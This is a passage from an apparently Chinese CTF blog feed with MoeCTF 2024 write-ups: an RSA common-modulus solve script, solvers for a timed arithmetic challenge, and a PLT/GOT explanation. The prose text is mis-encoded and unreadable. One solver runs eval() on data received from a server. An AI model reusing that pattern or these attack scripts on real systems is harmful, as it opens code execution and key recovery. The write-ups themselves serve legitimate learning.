class="number">16282992590526808657350657123769110323293742472515808696156540766049532922340638986423163288656942484229334024198335416611687418341772216996129634991032127943095069143600315325916614910606100091970611448259491799589221889445348698100959509165262891180065554743420149168801638644589921791426690475846945077068114953844817073866258377206796158690941199907230130273657375727245023893672164113928189304228859412794067127721813637080447782673535996272223836127807775157150041664783263093604946744032762535394974814371771505843653571711445892969781888188805943142126747365056482511805191315474848971218180999336497135314654469910566730389765499603897685968204361422568601724914800686608628299192714352963744010136960423806304763245890692476493455775025753944860040020178234660999290356849442926396627701588938894161779071628447041006556793933320976506046066961014953196791133933438500843139378274786265308568167479880984705152809744111382599071097574636570516674122980589207824718402382459624138317432883921371298272851693734695823787102433937406420318428888224246291987404818042038201886113203158444083427668636941</span></span><br><span class="line">c1= <span class="number">15508846802476602732219982269293312372397631462289816533805702700260237855119470146237752798828431803179124957728439730580289236458563016332461725094295883030444173189424666004498359269921250956676320570006883951982237098373954348825003467019876101438948387668628518937831820206221522881150831840296199498447304138839838135264071071817072965792514115711621435317078108239744829134467948386247696344881838815422262901903767893118533887779588425725845820071451782420200868341564360095012698956683395031351656817392008005928265838760875070634021907630535014959579709368637536268853337028760833769278841040734409299575870823873616769863828516877971432999417800417684146077045836940988096634144368727546539602310924702126212020003620219218637652874119299016382481718659448722433296761241365473608283436835986184098161365747699791248301452334044327014782249692551362625130537300221641910570569803981153117200694806974917501061411963827755822672178568783269357196133308719688843211664095412087717861154226475203597889635926903753481174280305996204091501578865951177135086807765873529089048911740160698421289371229606</span></span><br><span class="line">c2= <span class="number">7038544062804420883340530319534054090343999593726615071597649914714397773106261660516938820194721330117082799104642674913839235601210294807255855747823709326405317366422536981850436536877639492293904186333547681934006229055311359852552059601531864585759120757265084674695094298158389804437120173997679271166467086009884419942249925895393890707373985126949313101489352481737754459985522998334847972008827503987883850638250024631354158979424169551575287515128697843093987592614974905262077415255065744686115142126350167970451060399517705823298929164793769442986603707135790651560436497661713972277808036463771768932747376668116480068277125579165831615220097562066809632099809702980365194257899499384219864311379004681733844738981954144617140038448109869114888325128710654235506628539192955240723379334422880368605005772426413018696218105733457019400100498450734710865067764542737004071080719589912326985050985424145053072697267879019954400205613591419766583673115931337146967400159040252514654983240188915104134405655336152730443436887872604467679522955837013574944135975481174502094839012368918547420588186051</span></span><br></pre></td></tr></table></figure></div><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><ul><li>ç›´æ¥ä¸Šé¢˜è§£</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®å‡åœ¨ä¸Šé¢ï¼Œä¸ºäº†æ–¹ä¾¿çœ‹ï¼Œå°±ä¸å¡«å…¥äº†</span></span><br><span class="line">n = ...</span><br><span class="line">c1 = ...</span><br><span class="line">c2 = ...</span><br><span class="line"><span class="comment"># e1 * e2 = 59653</span></span><br><span class="line">e1e2 = <span class="number">59653</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1, e2, c1, c2, n</span>):</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1, s2 = s[<span class="number">1</span>], s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1, c1 = -s1, gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2, c2 = -s2, gmpy2.invert(c2, n)</span><br><span class="line"></span><br><span class="line">    m = (<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n)) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        mk = c + n * k</span><br><span class="line">        flag, true1 = gmpy2.iroot(mk, e)</span><br><span class="line">        <span class="keyword">if</span> true1:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, e1e2):</span><br><span class="line">    <span class="keyword">if</span> e1e2 % e1 == <span class="number">0</span>:</span><br><span class="line">        e2 = e1e2 // e1</span><br><span class="line">        c = rsa_gong_N_def(e1, e2, c1, c2, n)</span><br><span class="line">        e = gmpy2.gcd(e1, e2)</span><br><span class="line">        m1 = de(c, e, n)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> long_to_bytes(<span class="built_in">int</span>(m1)):</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m1)))</span><br></pre></td></tr></table></figure></div><ul><li>ä¸‹é¢å¯¹expè§£é‡Šï¼š</li></ul><ol><li>å…ˆæ‰¾åˆ°åˆé€‚çš„e1,e2,ä»¥åŠå¯¹åº”çš„M</li></ol><p><code>gmpy2.gcdext(e1,e2)</code>:</p><blockquote><p>è¿”å›ä¸€ä¸ªåŒ…å«ä¸‰ä¸ªå€¼çš„å…ƒç»„</p><p>s[0]-&gt;gcd(e1,e2)ï¼Œs[1]-&gt;s1, s[2] -&gt; s2 (e1<em>s1 + e2</em>s2 &#x3D;&#x3D;gcd(e1,e2))</p></blockquote><p><code>gmpy2.invert(c, n)</code></p><blockquote><p>è®¡ç®—cå…³äºæ¨¡mçš„é€†å…ƒ</p></blockquote><p>  2.c(M)å¸¦å…¥çˆ†ç ´ï¼Œæ­¤æ—¶æ»¡è¶³<code> mk = c + n * k</code></p><p><code>gmpy2.iroot</code></p><blockquote><p>ç”¨äºè®¡ç®—æ•´æ•° <code>x</code> çš„ <code>k</code> æ¬¡æ ¹ã€‚å®ƒè¿”å›ä¸€ä¸ªå…ƒç»„ <code>(root, is_exact)</code>ï¼Œå…¶ä¸­ï¼š</p><ol><li><strong>root</strong>ï¼š<code>x</code> çš„ <code>k</code> æ¬¡æ ¹çš„æ•´æ•°éƒ¨åˆ†ã€‚</li><li><strong>is_exact</strong>ï¼šä¸€ä¸ªå¸ƒå°”å€¼ï¼ŒæŒ‡ç¤º <code>root</code> æ˜¯å¦æ˜¯ <code>x</code> çš„ç¡®åˆ‡ <code>k</code> æ¬¡æ ¹</li></ol></blockquote><p>  3.åˆ¤æ–­çˆ†ç ´å‡ºæ¥çš„æ˜¯å¦åŒ…å«flagå³å¯</p>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moectf2024çŸ¥è¯†ç‚¹æ±‡æ€»</title>
      <link href="/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/"/>
      <url>/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><a class="link" href="https://ctf.xidian.edu.cn/training/10">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>æœ¬æ¬¡æ¯”èµ›å¯¹åŸºç¡€çš„è¦æ±‚å¯è°“æ˜¯å¾ˆæ·±å•Šï¼Œè®°å½•ä¸€äº›è‡ªå·±éœ€è¦å­¦ä¹ çš„æˆ–è€…æ˜¯åŸºç¡€ä¸ç‰¢å›ºï¼Œæ‰€éœ€è¦å­¦ä¹ çš„ç‚¹</p><h1 id="NotEnoughTime"><a href="#NotEnoughTime" class="headerlink" title="NotEnoughTime"></a><strong>NotEnoughTime</strong></h1><p><a class="link" href="https://ctf.xidian.edu.cn/training/10?challenge=63">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><mark>è¿ç”¨æ­£åˆ™åŒ¹é…è¿ç®—æ•°å­¦å¼å­<mark></mark></mark></p><ul><li>è´´ä¸€ä»½å®˜æ–¹wp</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = ...</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">io.sendline(</span><br><span class="line"><span class="built_in">str</span>(</span><br><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">io.recvuntil(<span class="string">b&quot;=&quot;</span>)</span><br><span class="line">.replace(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">.replace(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">.replace(<span class="string">b&quot;/&quot;</span>, <span class="string">b&quot;//&quot;</span>)</span><br><span class="line">.decode()</span><br><span class="line">)</span><br><span class="line">).encode()</span><br><span class="line">)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>è‡ªå·±è§£é¢˜æ—¶å€™çš„exp(é‡åº¦ä¾èµ–gpt)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸æœ¬åœ°æœåŠ¡çš„è¿æ¥</span></span><br><span class="line">host = <span class="string">&quot;192.168.107.52&quot;</span></span><br><span class="line">port = <span class="number">64064</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect_to_service</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_expression</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="comment"># åªä¿ç•™æ•°å­—ã€å››åˆ™è¿ç®—ç¬¦ã€æ‹¬å·å’Œç­‰å·</span></span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[^0-9+\-*/()=]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expression)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="comment"># å»æ‰ç­‰å·éƒ¨åˆ†</span></span><br><span class="line">    expression = expression.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># æ›¿æ¢ / ä¸º // è¿›è¡Œæ•´é™¤è®¡ç®—</span></span><br><span class="line">    expression = expression.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;//&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># è®¡ç®—ç®—å¼</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(expression)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è®¡ç®—å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = connect_to_service()</span><br><span class="line">    buffer = <span class="string">&quot;&quot;</span></span><br><span class="line">    data = s.recv(<span class="number">67</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># æ¯ç§’è¯»å–æœåŠ¡ç«¯çš„è¾“å‡º</span></span><br><span class="line">        data = s.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        buffer += data</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ”¶åˆ°æ•°æ®:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æå–ç®—å¼</span></span><br><span class="line">        expression = clean_expression(buffer)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> expression:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æå–çš„ç®—å¼:&quot;</span>, expression)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># è®¡ç®—ç»“æœ</span></span><br><span class="line">            result = calculate_expression(expression)</span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># å‘é€ç»“æœ</span></span><br><span class="line">                result_str = <span class="built_in">str</span>(result) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                s.send(result_str.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;å‘é€ç­”æ¡ˆ: <span class="subst">&#123;result_str.strip()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ¸…ç©ºç¼“å†²åŒº</span></span><br><span class="line">            buffer = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥æ˜¯å¦æœ‰ flag</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;moectf&#123;&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Flag è·å–:&quot;</span>, re.search(<span class="string">r&#x27;moectf\&#123;.*?\&#125;&#x27;</span>, data).group())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><h1 id="è¿™æ˜¯ä»€ä¹ˆï¼Ÿrandomï¼"><a href="#è¿™æ˜¯ä»€ä¹ˆï¼Ÿrandomï¼" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆï¼Ÿrandomï¼"></a><strong>è¿™æ˜¯ä»€ä¹ˆï¼Ÿrandomï¼</strong></h1><p><mark>çœŸéšæœºæ•°çˆ†ç ´<mark></mark></mark></p><p>åœ¨æˆ‘å†™çš„<a href="https://downbeat.top/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/">è¿™ç¯‡æ–‡ç« </a>é‡Œé¢å·²ç»æåˆ°è¿‡äº†</p><h1 id="è¿™æ˜¯ä»€ä¹ˆï¼ŸGOTï¼"><a href="#è¿™æ˜¯ä»€ä¹ˆï¼ŸGOTï¼" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆï¼ŸGOTï¼"></a><strong>è¿™æ˜¯ä»€ä¹ˆï¼ŸGOTï¼</strong></h1><p><mark>ç†è§£pltå’Œgotè¡¨ä¹‹é—´çš„å…³ç³»ï¼Œå·²ç»å‡½æ•°çœŸå®åœ°å€æ˜¯ä»å“ªé‡Œæ¥çš„<mark></mark></mark></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241015180637471.bmp"></p><blockquote><h3 id="è°ƒç”¨è¿‡ç¨‹è§£æ"><a href="#è°ƒç”¨è¿‡ç¨‹è§£æ" class="headerlink" title="è°ƒç”¨è¿‡ç¨‹è§£æ"></a>è°ƒç”¨è¿‡ç¨‹è§£æ</h3><ol><li><strong>ç¨‹åºå¯åŠ¨æ—¶</strong>ï¼š<ul><li>å½“ç¨‹åºç¼–è¯‘å¹¶é“¾æ¥æ—¶ï¼Œå¤–éƒ¨åº“å‡½æ•°ï¼ˆå¦‚ <code>system</code>ï¼‰çš„å®é™…åœ°å€åœ¨ç¼–è¯‘æœŸå¹¶ä¸ç¡®å®šï¼Œå°¤å…¶æ˜¯åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ã€‚ä¸ºäº†å¤„ç†è¿™ç§ä¸ç¡®å®šæ€§ï¼Œç¼–è¯‘å™¨ç”Ÿæˆäº† <code>PLT</code>ï¼ˆProcedure Linkage Tableï¼Œè¿‡ç¨‹é“¾æ¥è¡¨ï¼‰å’Œ <code>GOT</code>ï¼ˆGlobal Offset Tableï¼Œå…¨çƒåç§»è¡¨ï¼‰ã€‚</li></ul></li><li><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨ <code>system</code> æ—¶</strong>ï¼š<ul><li>å½“ç¨‹åºç¬¬ä¸€æ¬¡è°ƒç”¨ <code>system</code> å‡½æ•°æ—¶ï¼Œç¨‹åºå¹¶ä¸çŸ¥é“è¯¥å‡½æ•°çš„å®é™…å†…å­˜åœ°å€ã€‚æ‰€ä»¥ï¼Œç¨‹åºä¼šå…ˆè·³è½¬åˆ° <code>system@plt</code>ï¼Œå³ä½äº <code>PLT</code> è¡¨ä¸­çš„ <code>system</code> å‡½æ•°æ¡ç›®ã€‚</li><li>è¿™ä¸ª <code>system@plt</code> ä»£ç ï¼ˆä½ æåˆ°çš„ <code>.plt:0000000000401056</code> çš„ç‰‡æ®µï¼‰ä¼šå°†æŸä¸ªç´¢å¼•å€¼ï¼ˆ<code>push 2</code>ï¼‰å‹å…¥æ ˆï¼Œç„¶åè·³è½¬åˆ° <code>PLT</code> çš„è§£æå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ <code>sub_401020</code>ã€‚è¿™ä¸ªè§£æå‡½æ•°ä¼šè´Ÿè´£åŠ¨æ€é“¾æ¥çš„ç¬¦å·è§£æã€‚</li></ul></li><li><strong>åŠ¨æ€é“¾æ¥å™¨è§£æ</strong>ï¼š<ul><li>å½“æ‰§è¡Œåˆ° <code>sub_401020</code> æ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šæ£€æŸ¥ <code>GOT</code> è¡¨ï¼Œçœ‹ <code>system</code> å‡½æ•°çš„å®é™…åœ°å€æ˜¯å¦å·²ç»åŠ è½½åˆ° <code>GOT</code> ä¸­ã€‚</li><li>å¦‚æœ <code>GOT</code> ä¸­è¿˜æ²¡æœ‰ <code>system</code> çš„åœ°å€ï¼ˆè¿™æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶çš„æƒ…å†µï¼‰ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šè°ƒç”¨ <code>ld.so</code> æ¥æŸ¥æ‰¾ <code>system</code> å‡½æ•°çš„åœ°å€ï¼ˆæ¯”å¦‚ä» libc.so åº“ä¸­ï¼‰ï¼Œå¹¶å°†è¿™ä¸ªåœ°å€å¡«å…¥ <code>GOT</code> ä¸­ã€‚</li></ul></li><li>**åç»­è°ƒç”¨ <code>system</code>**ï¼š<ul><li>ä¸€æ—¦åŠ¨æ€é“¾æ¥å™¨æ‰¾åˆ°äº† <code>system</code> å‡½æ•°çš„å®é™…åœ°å€å¹¶å°†å…¶å†™å…¥åˆ° <code>GOT</code> è¡¨ä¸­ï¼Œåç»­å¯¹ <code>system</code> çš„è°ƒç”¨å°†ç›´æ¥é€šè¿‡ <code>GOT</code> è¡¨è·å–å…¶åœ°å€ï¼Œè€Œä¸å†ç»è¿‡ <code>system@plt</code> è¿›è¡Œè·³è½¬ã€‚è¿™æ ·å¯ä»¥æé«˜æ€§èƒ½ï¼Œå› ä¸ºé¿å…äº†æ¯æ¬¡è°ƒç”¨æ—¶çš„è·³è½¬å’Œè§£æã€‚</li></ul></li></ol><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨ <code>system</code></strong> æ—¶ï¼Œä¼šé€šè¿‡ <code>system@plt</code> è¿›è¡Œè·³è½¬å’Œè§£æï¼Œå› ä¸ºç¨‹åºè¿˜ä¸çŸ¥é“ <code>system</code> çš„å®é™…åœ°å€ã€‚</li><li><strong>åç»­è°ƒç”¨ <code>system</code></strong> åˆ™ä¼šç›´æ¥ä½¿ç”¨ <code>GOT</code> è¡¨ä¸­ç¼“å­˜çš„åœ°å€ï¼Œä»è€ŒåŠ å¿«å‡½æ•°è°ƒç”¨çš„é€Ÿåº¦ã€‚</li></ul><p>è¿™ä¸ªæœºåˆ¶æ˜¯åŠ¨æ€é“¾æ¥åº“çš„ä¸€éƒ¨åˆ†ï¼Œç›®çš„æ˜¯è®©ç¨‹åºåœ¨è¿è¡Œæ—¶åŠ¨æ€è§£æå‡½æ•°åœ°å€ï¼Œè€Œä¸æ˜¯åœ¨ç¼–è¯‘æ—¶å°±ç»‘å®šå‡½æ•°åœ°å€ã€‚</p></blockquote><ul><li>åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨systemçš„æ—¶å€™ï¼Œä¼šå»<code>0x401056</code>åœ°å€ï¼Œè€Œelf.plt[â€˜systemâ€™]æ˜¯0x401050ï¼Œä¸‹é¢ç†è§£ä¸€ä¸‹ä¸ºä»€ä¹ˆï¼š</li></ul><blockquote><h3 id="PLT-æœºåˆ¶æ¦‚è¿°"><a href="#PLT-æœºåˆ¶æ¦‚è¿°" class="headerlink" title="PLT æœºåˆ¶æ¦‚è¿°"></a>PLT æœºåˆ¶æ¦‚è¿°</h3><p><code>PLT</code>ï¼ˆProcedure Linkage Tableï¼‰ æ˜¯ ELF æ–‡ä»¶ä¸­çš„ä¸€ä¸ªç»“æ„ï¼Œç”¨äºå»¶è¿Ÿç»‘å®šåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°åœ°å€ã€‚æ¯ä¸ªåŠ¨æ€å‡½æ•°ï¼ˆå¦‚ <code>system</code>ï¼‰åœ¨ <code>PLT</code> ä¸­æœ‰ä¸€ä¸ªæ¡ç›®ã€‚è¿™ä¸ªæ¡ç›®ä¸»è¦åŒ…å«ä¸¤éƒ¨åˆ†ï¼š</p><ol><li><p>PLT Entry</p><p>ï¼ˆ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system@plt</span><br></pre></td></tr></table></figure></div><p>ï¼‰ï¼š</p><ul><li>æ¯ä¸ªå‡½æ•°åœ¨ <code>PLT</code> ä¸­æœ‰ä¸€ä¸ªå…¥å£ï¼Œè´Ÿè´£è·³è½¬åˆ°å®é™…çš„å‡½æ•°å®ç°ã€‚</li><li>ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå…¥å£ä¼šè·³è½¬åˆ°åŠ¨æ€é“¾æ¥è§£æå™¨æ¥è§£æå‡½æ•°åœ°å€ã€‚</li></ul></li><li><p>PLT Stub</p><p>ï¼š</p><ul><li>æ¯ä¸ªå‡½æ•°çš„ <code>PLT</code> æ¡ç›®åŒ…å«ä¸€äº›æŒ‡ä»¤ï¼Œç”¨æ¥åšè·³è½¬ä»¥åŠå‚æ•°å‹æ ˆç­‰æ“ä½œã€‚</li><li>è¿™äº›æŒ‡ä»¤ä½äº <code>PLT</code> ä¸­ç¨åçš„ä½ç½®ï¼ˆé€šå¸¸ä¼šåç§»å‡ ä¸ªå­—èŠ‚ï¼‰ã€‚</li></ul></li></ol><h3 id="å…·ä½“æƒ…å†µï¼šä¸ºä»€ä¹ˆè·³åˆ°-0x401056-è€Œä¸æ˜¯-0x401050ï¼Ÿ"><a href="#å…·ä½“æƒ…å†µï¼šä¸ºä»€ä¹ˆè·³åˆ°-0x401056-è€Œä¸æ˜¯-0x401050ï¼Ÿ" class="headerlink" title="å…·ä½“æƒ…å†µï¼šä¸ºä»€ä¹ˆè·³åˆ° 0x401056 è€Œä¸æ˜¯ 0x401050ï¼Ÿ"></a>å…·ä½“æƒ…å†µï¼šä¸ºä»€ä¹ˆè·³åˆ° <code>0x401056</code> è€Œä¸æ˜¯ <code>0x401050</code>ï¼Ÿ</h3><p>åœ¨ä½ çš„æƒ…å†µä¸­ï¼Œ<code>PLT</code> å…¥å£ä¸º <code>0x401050</code>ï¼Œä½†ç¬¬ä¸€æ¬¡è°ƒç”¨å®é™…è·³è½¬åˆ°äº† <code>0x401056</code>ï¼Œè¿™æ˜¯å› ä¸º <code>0x401050</code> åˆ° <code>0x401056</code> ä¹‹é—´æ˜¯ä¸€ä¸ªè·³è½¬æŒ‡ä»¤çš„é¢„ç•™åŒºåŸŸï¼Œè€Œå®é™…çš„æŒ‡ä»¤ä» <code>0x401056</code> å¼€å§‹ã€‚ä»¥ä¸‹æ˜¯ç»†èŠ‚è§£é‡Šï¼š</p><h4 id="æ±‡ç¼–ä»£ç å›é¡¾ï¼š"><a href="#æ±‡ç¼–ä»£ç å›é¡¾ï¼š" class="headerlink" title="æ±‡ç¼–ä»£ç å›é¡¾ï¼š"></a>æ±‡ç¼–ä»£ç å›é¡¾ï¼š</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">asmå¤åˆ¶ä»£ç .plt:0000000000401050 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:0000000000401056 push    2</span><br><span class="line">.plt:000000000040105B jmp     sub_401020</span><br></pre></td></tr></table></figure></div><ul><li><code>0x401050</code> æ˜¯ <code>system@plt</code> çš„æ¡ç›®èµ·å§‹åœ°å€ï¼Œä½†å®ƒä¸æ˜¯ç¬¬ä¸€æ¡å®é™…æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</li><li>åœ¨ ELF æ–‡ä»¶ä¸­ï¼Œæ¯ä¸ª <code>PLT</code> æ¡ç›®å¯èƒ½ä¼šæœ‰ä¸€ä¸ªè·³è½¬è¡¨æ ¼æˆ–è€…å 